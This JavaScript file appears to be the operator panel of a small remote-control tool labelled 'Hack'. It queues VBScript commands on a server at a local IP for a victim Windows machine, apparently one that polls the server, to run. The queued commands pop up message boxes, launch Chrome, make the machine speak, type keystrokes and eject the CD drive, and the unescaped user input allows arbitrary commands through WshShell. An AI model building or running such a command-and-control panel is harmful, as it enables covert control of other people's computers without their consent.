const URL = "http://192.168.1.162:8000";

const getCommand = () => {
    $.ajax({
        method: "GET",
        crossDomain: true,
        url: URL + "/getHack/test",
        success: (res) => {
            console.log("Success");
            console.log(res)
            $("#last-command").html(res);
        },
        error: (res) => {
            console.log("failure");
            console.log(res);
        }
      })
}

$(document).ready(function() {

    getCommand();

    let code = {
        msgBox: (msg) => `MsgBox "${msg}"`,
        chrome: (url) => `WshShell.Run "chrome -url ${url}"`,
        speech: (speech) => `Dim SpeechObject: Set SpeechObject=CreateObject("sapi.spvoice"): SpeechObject.speak "${speech}"`,
        notepad: (text) => `WshShell.Run "%windir%\\notepad.exe": WshShell.AppActivate "Notepad": WScript.Sleep 500: WshShell.SendKeys "${text}"`,
        key: (key) => `WshShell.SendKeys "{${key}}"`,
        openDrive: () => `Set oWMP = CreateObject("WMPlayer.OCX.7" ): Set colCDROMs = oWMP.cdromCollection: If colCDROMs.Count >= 1 Then: For i = 0 to colCDROMs.Count - 1: colCDROMs.Item(i).Eject: Next`,
    }

    $(".command-button").click((e) => {
        let id = e.target.id;
        let input = $(`#${id}-input`).val();
        let command = code[id](input);

        $.ajax({
            method: "POST",
            crossDomain: true,
            url: URL + "/updateHack/test",
            data: {
                code: command
            },
            dataType: "JSON",
            success: (res) => {
                console.log("Success");
                console.log(res)
                getCommand();
            },
            error: (res) => {
                console.log("failure");
                console.log(res);
            }
          })
    })
})
